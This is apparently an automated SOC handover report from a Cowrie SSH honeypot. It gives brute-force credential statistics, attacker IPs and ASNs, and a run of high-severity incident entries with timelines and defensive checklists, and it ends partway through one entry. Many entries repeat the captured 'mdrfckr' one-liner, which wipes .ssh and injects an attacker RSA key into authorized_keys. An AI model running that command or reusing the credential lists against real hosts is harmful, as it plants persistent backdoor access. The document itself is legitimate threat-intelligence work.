# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-31 |
| **Generated At** | 2026-03-31T05:44:11Z |
| **Shift Time** | 05:44 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **84** |
| Confirmed Threats | **77** |
| False Positives Filtered | **7** (8.3%) |
| Unique Attacker IPs | **44** |
| Countries of Origin | **17** |
| High Severity Cases | **23** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **61** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **60** |
| Unique Credential Pairs | **39** |
| Unique Usernames | **22** |
| Unique Passwords | **39** |
| Successful Auth Pairs | **15** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 24 |
| `345gs5662d34` | 12 |
| `ubnt` | 3 |
| `default` | 2 |
| `user` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 12 |
| `3245gs5662d34` | 11 |
| `222222` | 1 |
| `6666` | 1 |
| `1234567890` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 12 |
| `root` | `3245gs5662d34` | 11 |
| `centos` | `222222` | 1 |
| `ubnt` | `6666` | 1 |
| `Centos` | `1234567890` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123QWEqwe!@#` | `36.134.147.79` | 2026-03-31T02:17:54 |
| `root` | `3245gs5662d34` | `36.134.147.79` | 2026-03-31T02:17:58 |
| `root` | `edong123456` | `183.110.63.196` | 2026-03-31T03:12:38 |
| `root` | `3245gs5662d34` | `183.110.63.196` | 2026-03-31T03:12:42 |
| `root` | `qi1234567` | `183.110.63.196` | 2026-03-31T03:16:10 |
| `root` | `A1qaz2wsx` | `183.110.63.196` | 2026-03-31T03:19:38 |
| `root` | `chat6123456` | `183.110.63.196` | 2026-03-31T03:23:54 |
| `root` | `!QAZ@WSX3edc` | `183.110.63.196` | 2026-03-31T03:27:28 |
| `root` | `chinahengbing` | `183.110.63.196` | 2026-03-31T03:30:57 |
| `root` | `konsone@2026` | `183.110.63.196` | 2026-03-31T03:34:28 |
| `root` | `Asd123456` | `183.110.63.196` | 2026-03-31T03:37:50 |
| `root` | `Lb123456.` | `183.110.63.196` | 2026-03-31T03:41:20 |
| `root` | `planet1` | `120.48.147.111` | 2026-03-31T05:35:03 |
| `root` | `qwert123@` | `47.237.73.171` | 2026-03-31T05:40:10 |
| `root` | `3245gs5662d34` | `47.237.73.171` | 2026-03-31T05:40:12 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 11 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `183.110.63.196`, `47.237.73.171`, `36.134.147.79`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **44** |
| Unique ASNs | **38** |
| High-Risk ASNs | **31** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS46562` | Performive LLC | 2 | MEDIUM |
| `AS45899` | VNPT Corp | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS17421` | Mobile Business Group | 1 | HIGH |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (23)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-2e68bd810718

| Field | Detail |
|---|---|
| **Source IP** | `36.134.147[.]79` |
| **First Seen** | 2026-03-31 02:17 |
| **Last Seen** | 2026-03-31 02:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 02:17:53` | `cowrie.session.connect` |
| `2026-03-31 02:17:53` | `cowrie.client.version` |
| `2026-03-31 02:17:53` | `cowrie.client.kex` |
| `2026-03-31 02:17:54` | `cowrie.login.success` |
| `2026-03-31 02:17:54` | `cowrie.session.params` |
| `2026-03-31 02:17:54` | `cowrie.command.input` |
| `2026-03-31 02:17:54` | `cowrie.command.failed` |
| `2026-03-31 02:17:55` | `cowrie.log.closed` |
| `2026-03-31 02:17:55` | `cowrie.session.params` |
| `2026-03-31 02:17:55` | `cowrie.command.input` |
| `2026-03-31 02:17:55` | `cowrie.session.file_download` |
| `2026-03-31 02:17:55` | `cowrie.log.closed` |
| `2026-03-31 02:17:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.134.147[.]79` to AbuseIPDB if not already reported
- [ ] Block `36.134.147[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a99048ec437e

| Field | Detail |
|---|---|
| **Source IP** | `36.134.147[.]79` |
| **First Seen** | 2026-03-31 02:17 |
| **Last Seen** | 2026-03-31 02:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 02:17:57` | `cowrie.session.connect` |
| `2026-03-31 02:17:57` | `cowrie.client.version` |
| `2026-03-31 02:17:57` | `cowrie.client.kex` |
| `2026-03-31 02:17:58` | `cowrie.login.success` |
| `2026-03-31 02:17:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.134.147[.]79` to AbuseIPDB if not already reported
- [ ] Block `36.134.147[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b78727ee5050

| Field | Detail |
|---|---|
| **Source IP** | `183.110.63[.]196` |
| **First Seen** | 2026-03-31 03:12 |
| **Last Seen** | 2026-03-31 03:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 03:12:37` | `cowrie.session.connect` |
| `2026-03-31 03:12:37` | `cowrie.client.version` |
| `2026-03-31 03:12:37` | `cowrie.client.kex` |
| `2026-03-31 03:12:38` | `cowrie.login.success` |
| `2026-03-31 03:12:38` | `cowrie.session.params` |
| `2026-03-31 03:12:38` | `cowrie.command.input` |
| `2026-03-31 03:12:38` | `cowrie.command.failed` |
| `2026-03-31 03:12:39` | `cowrie.log.closed` |
| `2026-03-31 03:12:39` | `cowrie.session.params` |
| `2026-03-31 03:12:39` | `cowrie.command.input` |
| `2026-03-31 03:12:39` | `cowrie.session.file_download` |
| `2026-03-31 03:12:39` | `cowrie.log.closed` |
| `2026-03-31 03:12:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.110.63[.]196` to AbuseIPDB if not already reported
- [ ] Block `183.110.63[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f1649a9f839

| Field | Detail |
|---|---|
| **Source IP** | `183.110.63[.]196` |
| **First Seen** | 2026-03-31 03:12 |
| **Last Seen** | 2026-03-31 03:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 03:12:41` | `cowrie.session.connect` |
| `2026-03-31 03:12:41` | `cowrie.client.version` |
| `2026-03-31 03:12:41` | `cowrie.client.kex` |
| `2026-03-31 03:12:42` | `cowrie.login.success` |
| `2026-03-31 03:12:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.110.63[.]196` to AbuseIPDB if not already reported
- [ ] Block `183.110.63[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe06bd852c0d

| Field | Detail |
|---|---|
| **Source IP** | `183.110.63[.]196` |
| **First Seen** | 2026-03-31 03:16 |
| **Last Seen** | 2026-03-31 03:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 03:16:09` | `cowrie.session.connect` |
| `2026-03-31 03:16:09` | `cowrie.client.version` |
| `2026-03-31 03:16:09` | `cowrie.client.kex` |
| `2026-03-31 03:16:10` | `cowrie.login.success` |
| `2026-03-31 03:16:10` | `cowrie.session.params` |
| `2026-03-31 03:16:10` | `cowrie.command.input` |
| `2026-03-31 03:16:10` | `cowrie.command.failed` |
| `2026-03-31 03:16:10` | `cowrie.log.closed` |
| `2026-03-31 03:16:10` | `cowrie.session.params` |
| `2026-03-31 03:16:10` | `cowrie.command.input` |
| `2026-03-31 03:16:10` | `cowrie.session.file_download` |
| `2026-03-31 03:16:10` | `cowrie.log.closed` |
| `2026-03-31 03:16:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.110.63[.]196` to AbuseIPDB if not already reported
- [ ] Block `183.110.63[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f53171e4cadf

| Field | Detail |
|---|---|
| **Source IP** | `183.110.63[.]196` |
| **First Seen** | 2026-03-31 03:16 |
| **Last Seen** | 2026-03-31 03:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 03:16:12` | `cowrie.session.connect` |
| `2026-03-31 03:16:12` | `cowrie.client.version` |
| `2026-03-31 03:16:13` | `cowrie.client.kex` |
| `2026-03-31 03:16:13` | `cowrie.login.success` |
| `2026-03-31 03:16:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.110.63[.]196` to AbuseIPDB if not already reported
- [ ] Block `183.110.63[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b25819cdf335

| Field | Detail |
|---|---|
| **Source IP** | `183.110.63[.]196` |
| **First Seen** | 2026-03-31 03:19 |
| **Last Seen** | 2026-03-31 03:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 03:19:37` | `cowrie.session.connect` |
| `2026-03-31 03:19:37` | `cowrie.client.version` |
| `2026-03-31 03:19:37` | `cowrie.client.kex` |
| `2026-03-31 03:19:38` | `cowrie.login.success` |
| `2026-03-31 03:19:38` | `cowrie.session.params` |
| `2026-03-31 03:19:38` | `cowrie.command.input` |
| `2026-03-31 03:19:38` | `cowrie.command.failed` |
| `2026-03-31 03:19:38` | `cowrie.log.closed` |
| `2026-03-31 03:19:39` | `cowrie.session.params` |
| `2026-03-31 03:19:39` | `cowrie.command.input` |
| `2026-03-31 03:19:39` | `cowrie.session.file_download` |
| `2026-03-31 03:19:39` | `cowrie.log.closed` |
| `2026-03-31 03:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.110.63[.]196` to AbuseIPDB if not already reported
- [ ] Block `183.110.63[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf3f01a6ed58

| Field | Detail |
|---|---|
| **Source IP** | `183.110.63[.]196` |
| **First Seen** | 2026-03-31 03:19 |
| **Last Seen** | 2026-03-31 03:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 03:19:41` | `cowrie.session.connect` |
| `2026-03-31 03:19:41` | `cowrie.client.version` |
| `2026-03-31 03:19:41` | `cowrie.client.kex` |
| `2026-03-31 03:19:42` | `cowrie.login.success` |
| `2026-03-31 03:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.110.63[.]196` to AbuseIPDB if not already reported
- [ ] Block `183.110.63[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df6e115d7a5e

| Field | Detail |
|---|---|
| **Source IP** | `183.110.63[.]196` |
| **First Seen** | 2026-03-31 03:23 |
| **Last Seen** | 2026-03-31 03:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 03:23:53` | `cowrie.session.connect` |
| `2026-03-31 03:23:53` | `cowrie.client.version` |
| `2026-03-31 03:23:53` | `cowrie.client.kex` |
| `2026-03-31 03:23:54` | `cowrie.login.success` |
| `2026-03-31 03:23:54` | `cowrie.session.params` |
| `2026-03-31 03:23:54` | `cowrie.command.input` |
| `2026-03-31 03:23:54` | `cowrie.command.failed` |
| `2026-03-31 03:23:54` | `cowrie.log.closed` |
| `2026-03-31 03:23:55` | `cowrie.session.params` |
| `2026-03-31 03:23:55` | `cowrie.command.input` |
| `2026-03-31 03:23:55` | `cowrie.session.file_download` |
| `2026-03-31 03:23:55` | `cowrie.log.closed` |
| `2026-03-31 03:23:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.110.63[.]196` to AbuseIPDB if not already reported
- [ ] Block `183.110.63[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11f0943fcc22

| Field | Detail |
|---|---|
| **Source IP** | `183.110.63[.]196` |
| **First Seen** | 2026-03-31 03:23 |
| **Last Seen** | 2026-03-31 03:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 03:23:57` | `cowrie.session.connect` |
| `2026-03-31 03:23:57` | `cowrie.client.version` |
| `2026-03-31 03:23:57` | `cowrie.client.kex` |
| `2026-03-31 03:23:58` | `cowrie.login.success` |
| `2026-03-31 03:23:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.110.63[.]196` to AbuseIPDB if not already reported
- [ ] Block `183.110.63[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-727bf3d6f2d6

| Field | Detail |
|---|---|
| **Source IP** | `183.110.63[.]196` |
| **First Seen** | 2026-03-31 03:27 |
| **Last Seen** | 2026-03-31 03:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 03:27:28` | `cowrie.session.connect` |
| `2026-03-31 03:27:28` | `cowrie.client.version` |
| `2026-03-31 03:27:28` | `cowrie.client.kex` |
| `2026-03-31 03:27:28` | `cowrie.login.success` |
| `2026-03-31 03:27:29` | `cowrie.session.params` |
| `2026-03-31 03:27:29` | `cowrie.command.input` |
| `2026-03-31 03:27:29` | `cowrie.command.failed` |
| `2026-03-31 03:27:29` | `cowrie.log.closed` |
| `2026-03-31 03:27:29` | `cowrie.session.params` |
| `2026-03-31 03:27:29` | `cowrie.command.input` |
| `2026-03-31 03:27:29` | `cowrie.session.file_download` |
| `2026-03-31 03:27:29` | `cowrie.log.closed` |
| `2026-03-31 03:27:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.110.63[.]196` to AbuseIPDB if not already reported
- [ ] Block `183.110.63[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cd8ee50a437

| Field | Detail |
|---|---|
| **Source IP** | `183.110.63[.]196` |
| **First Seen** | 2026-03-31 03:27 |
| **Last Seen** | 2026-03-31 03:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 03:27:31` | `cowrie.session.connect` |
| `2026-03-31 03:27:31` | `cowrie.client.version` |
| `2026-03-31 03:27:31` | `cowrie.client.kex` |
| `2026-03-31 03:27:32` | `cowrie.login.success` |
| `2026-03-31 03:27:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.110.63[.]196` to AbuseIPDB if not already reported
- [ ] Block `183.110.63[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-503c8831bb6b

| Field | Detail |
|---|---|
| **Source IP** | `183.110.63[.]196` |
| **First Seen** | 2026-03-31 03:30 |
| **Last Seen** | 2026-03-31 03:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 03:30:56` | `cowrie.session.connect` |
| `2026-03-31 03:30:56` | `cowrie.client.version` |
| `2026-03-31 03:30:56` | `cowrie.client.kex` |
| `2026-03-31 03:30:57` | `cowrie.login.success` |
| `2026-03-31 03:30:57` | `cowrie.session.params` |
| `2026-03-31 03:30:57` | `cowrie.command.input` |
| `2026-03-31 03:30:57` | `cowrie.command.failed` |
| `2026-03-31 03:30:57` | `cowrie.log.closed` |
| `2026-03-31 03:30:57` | `cowrie.session.params` |
| `2026-03-31 03:30:57` | `cowrie.command.input` |
| `2026-03-31 03:30:57` | `cowrie.session.file_download` |
| `2026-03-31 03:30:57` | `cowrie.log.closed` |
| `2026-03-31 03:31:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.110.63[.]196` to AbuseIPDB if not already reported
- [ ] Block `183.110.63[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50037fb5e0c9

| Field | Detail |
|---|---|
| **Source IP** | `183.110.63[.]196` |
| **First Seen** | 2026-03-31 03:30 |
| **Last Seen** | 2026-03-31 03:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 03:30:59` | `cowrie.session.connect` |
| `2026-03-31 03:30:59` | `cowrie.client.version` |
| `2026-03-31 03:31:00` | `cowrie.client.kex` |
| `2026-03-31 03:31:00` | `cowrie.login.success` |
| `2026-03-31 03:31:00` | `cowrie.session.closed` |

**Recommended Actions:**
